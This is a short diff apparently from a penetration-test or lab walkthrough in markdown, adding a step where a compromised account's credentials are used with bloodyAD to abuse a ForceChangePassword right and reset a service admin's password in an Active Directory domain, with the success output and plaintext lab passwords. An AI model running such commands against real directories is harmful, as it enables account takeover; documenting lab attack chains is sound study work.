@@ -1143,5 +1143,12 @@ This user is now compromised!
 The newly compromised user has ForceChangePassword on this user
 
 ```python
+bloodyAD --host dc.novaforge.local -d novaforge.local -u frank.white -p '1hatefrank' set password 'svc_it_admin' 'Password123!'
+[+] Password changed successfully!
+```
+
+The password is now changed
+
+```python
 
 ```
